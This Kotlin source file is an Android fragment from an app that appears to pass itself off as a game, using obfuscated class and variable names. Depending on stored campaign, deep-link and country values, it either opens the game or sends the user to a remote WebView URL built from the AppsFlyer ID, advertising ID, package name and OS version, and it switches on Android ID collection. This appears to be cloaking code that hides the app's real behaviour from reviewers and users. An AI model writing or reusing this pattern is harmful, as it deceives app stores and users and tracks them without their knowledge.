package com.artifexmundi.bal.fffragg

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.artifexmundi.bal.R
import com.artifexmundi.bal.gaaamee.GaaimimiActivity
import com.artifexmundi.bal.otther.Util.PACKKK
import com.artifexmundi.bal.otther.Util.ad_id
import com.artifexmundi.bal.otther.Util.apps
import com.artifexmundi.bal.otther.Util.aps_id
import com.artifexmundi.bal.otther.Util.codeCode
import com.artifexmundi.bal.otther.Util.geoCo
import com.artifexmundi.bal.otther.Util.instId
import com.artifexmundi.bal.otther.Util.keyVAl
import com.artifexmundi.bal.otther.Util.linkaa
import com.artifexmundi.bal.otther.Util.myId
import com.artifexmundi.bal.otther.Util.namm
import com.artifexmundi.bal.otther.Util.one
import com.artifexmundi.bal.otther.Util.subFive
import com.artifexmundi.bal.otther.Util.subFour
import com.artifexmundi.bal.otther.Util.subOne
import com.artifexmundi.bal.otther.Util.subSix
import com.artifexmundi.bal.otther.Util.trololo
import com.artifexmundi.bal.otther.Util.urlMain
import com.artifexmundi.bal.vieevmod.VebbbbActivity
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FilllFragment : Fragment() {
    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_filll, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val count = shareP.getString(geoCo, null)
        val appCamp = shareP.getString("appCamp", null)
        val deepSt = shareP.getString("deepSt", null)
        val countryDev = shareP.getString(codeCode, null)
        val apps = shareP.getString(apps, null)
        val wv = shareP.getString(urlMain, null)
        val mainId = shareP.getString("mainId", null)
        val pack = PACKKK
        val buildVers = Build.VERSION.RELEASE
        val myTrId = shareP.getString(myId, null)
        val myInstId: String? = shareP.getString(instId, null)

        Log.d("lolo", "countryDev $countryDev")
        Log.d("lolo", "count $count")
        Log.d("lolo", "count $apps")

        val intentBeam = Intent(activity, VebbbbActivity::class.java)
        val intentGame = Intent(activity, GaaimimiActivity::class.java)

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_id, afId).apply()

        val linkApps = "$wv$subOne$appCamp&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkMT = "$wv$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkFB = "$wv$subOne$deepSt&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$trololo"
        val linkFBNullApps = "$wv$subOne$deepSt&$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$trololo"

        when(apps) {
            "1" ->
                if(appCamp!!.contains(keyVAl)) {
                    shareP.edit().putString(linkaa, linkApps).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (deepSt!=null||countryDev!!.contains(count.toString())) {
                    shareP.edit().putString(linkaa, linkFB).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
            "0" ->
                if(deepSt!=null) {
                    shareP.edit().putString(linkaa, linkFBNullApps).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (countryDev!!.contains(count.toString())) {
                    shareP.edit().putString(linkaa, linkMT).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
        }
    }
}
